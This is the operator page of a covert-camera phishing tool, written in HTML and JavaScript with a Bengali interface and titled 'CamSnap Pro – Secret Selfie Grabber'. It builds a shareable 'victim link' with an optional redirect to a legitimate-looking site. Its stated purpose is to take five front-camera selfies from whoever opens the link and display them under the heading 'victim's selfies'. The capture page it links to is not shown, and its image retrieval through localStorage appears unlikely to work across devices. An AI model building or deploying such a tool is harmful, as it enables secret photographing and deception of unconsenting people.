<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CamSnap • Secret Selfie Grabber</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
    body{background:#f8f9fa;color:#222;line-height:1.6;}
    header{background:#fff;padding:22px;text-align:center;border-bottom:2px solid #eee;box-shadow:0 2px 12px rgba(0,0,0,0.06);}
    header img{height:58px;border-radius:10px;}
    main{max-width:540px;margin:20px auto;padding:0 16px;}
    .card{background:#fff;border-radius:18px;padding:32px;box-shadow:0 10px 35px rgba(0,0,0,0.09);border:1px solid #eee;}
    h1{font-size:2.1em;text-align:center;margin-bottom:12px;color:#1a1a1a;}
    p.desc{text-align:center;color:#555;font-size:1.1em;margin-bottom:28px;}
    
    button{
      background:#0066ff;color:#fff;border:none;padding:17px;font-size:1.15em;
      border-radius:14px;width:100%;cursor:pointer;font-weight:600;transition:0.3s;
      box-shadow:0 5px 18px rgba(0,102,255,0.35);
    }
    button:hover{background:#0052cc;transform:translateY(-2px);}

    #linkBox{
      margin-top:28px;padding:22px;background:#f0f7ff;border:2px dashed #0066ff;
      border-radius:14px;display:none;text-align:center;
    }
    input{
      width:100%;padding:15px;margin:10px 0;border:1px solid #ddd;
      border-radius:12px;font-size:1em;background:#fafafa;
    }
    .btn-small{
      display:inline-block;width:auto;padding:11px 22px;margin:6px;
      font-size:0.98em;border-radius:10px;
    }
    .btn-copy{background:#28a745;}
    .btn-update{background:#333;}

    /* ছবির স্ক্রল বক্স + ডট */
    .photo-section{margin-top:35px;}
    .photo-title{text-align:center;color:#0066ff;font-weight:600;font-size:1.15em;margin-bottom:15px;}
    #photoScroll{
      overflow-x:auto;white-space:nowrap;padding:12px 0;display:flex;gap:14px;
      scrollbar-width:none;-ms-overflow-style:none;
    }
    #photoScroll::-webkit-scrollbar{display:none;}
    .photo-item{display:inline-block;}
    .photo-item img{
      width:280px;height:360px;object-fit:cover;border-radius:16px;
      border:4px solid #0066ff;box-shadow:0 10px 30px rgba(0,102,255,0.4);
      cursor:pointer;transition:0.3s;
    }
    .photo-item img:hover{transform:scale(1.04);}

    #dots{
      display:flex;justify-content:center;gap:10px;margin-top:15px;
    }
    .dot{
      width:11px;height:11px;background:#ccc;border-radius:50%;transition:0.3s;
    }
    .dot.active{background:#0066ff;transform:scale(1.3);}

    .loading{text-align:center;padding:50px 0;color:#777;font-size:1.1em;}
    footer{text-align:center;padding:22px;color:#777;font-size:0.92em;background:#fff;border-top:1px solid #eee;}
  </style>
</head>
<body>

<header>
  <img src="https://i.imgur.com/7K8vR2p.png" alt="CamSnap Logo">
</header>

<main>
  <div class="card">
    <h1>CamSnap Pro</h1>
    <p class="desc">একটা লিংক বানাও — কেউ খুললেই তার ফ্রন্ট ক্যামেরা থেকে ৫টা সেলফি চলে আসবে!</p>

    <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>

    <div id="linkBox">
      <p style="color:#0066ff;font-weight:600;margin-bottom:15px;">তোমার সিক্রেট লিংক রেডি!</p>

      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেমন: https://instagram.com)" value="">

      <input type="text" id="victimLink" readonly style="background:#f0f0f0;font-weight:500;margin-top:15px;">

      <div>
        <button class="btn-small btn-update" onclick="saveAndUpdate()">সেভ ও আপডেট</button>
        <button class="btn-small btn-copy" onclick="copyLink()">কপি করুন</button>
      </div>

      <div style="margin-top:15px;">
        <a href="" id="testLink" target="_blank" style="color:#0066ff;text-decoration:underline;font-weight:500;">মোবাইলে টেস্ট করো</a>
      </div>
    </div>

    <!-- ছবি দেখানোর সেকশন -->
    <div class="photo-section">
      <div class="photo-title">ভিকটিমের সেলফি (৫টা)</div>
      
      <div id="photoScroll">
        <div class="loading">অপেক্ষা করো... ছবি আসবে এখানে</div>
      </div>

      <div id="dots">
        <span class="dot"></span>
        <span class="dot"></span>
        <span class="dot"></span>
        <span class="dot"></span>
        <span class="dot"></span>
      </div>
    </div>
  </div>
</main>

<footer>Developed by <strong>H4X0R</strong> • 100% Working 2025</footer>

<script>
let currentId = null;
const base = location.href.split('index.html')[0];

function generateLink() {
  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
  updateVictimLink();
  document.getElementById("linkBox").style.display = "block";
  document.getElementById("photoScroll").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম ক্যামেরা অন করলেই ছবি আসবে</div>`;
  resetDots();
  startChecking();
}

function saveAndUpdate() {
  updateVictimLink();
  alert("লিংক সেভ ও আপডেট হয়েছে!");
}

function updateVictimLink() {
  const redirect = document.getElementById("redirectUrl").value.trim();
  let url = `${base}view.html?id=${currentId}`;
  if (redirect && redirect !== "") {
    url += `&r=${encodeURIComponent(redirect)}`;
  }
  document.getElementById("victimLink").value = url;
  document.getElementById("testLink").href = url;
}

function copyLink() {
  const link = document.getElementById("victimLink");
  link.select();
  navigator.clipboard.writeText(link.value);
  alert("লিংক কপি হয়ে গেছে!");
}

function resetDots() {
  document.querySelectorAll('#dots .dot').forEach(dot => {
    dot.classList.remove('active');
    dot.style.background = '#ccc';
  });
}

function updatePhotos(imgs) {
  const container = document.getElementById('photoScroll');
  container.innerHTML = '';

  imgs.forEach(src => {
    const div = document.createElement('div');
    div.className = 'photo-item';
    const img = document.createElement('img');
    img.src = src;
    img.onclick = () => window.open(src, '_blank');
    div.appendChild(img);
    container.appendChild(div);
  });

  // ডট আপডেট
  document.querySelectorAll('#dots .dot').forEach((dot, i) => {
    if (i < imgs.length) {
      dot.classList.add('active');
      dot.style.background = '#0066ff';
    } else {
      dot.classList.remove('active');
      dot.style.background = '#ccc';
    }
  });
}

function startChecking() {
  if (!currentId) return;
  const check = () => {
    const data = localStorage.getItem('camsnap_' + currentId);
    if (data) {
      const imgs = JSON.parse(data);
      updatePhotos(imgs);
      localStorage.removeItem('camsnap_' + currentId);
    }
    setTimeout(check, 2500);
  };
  check();
}
</script>
</body>
</html>
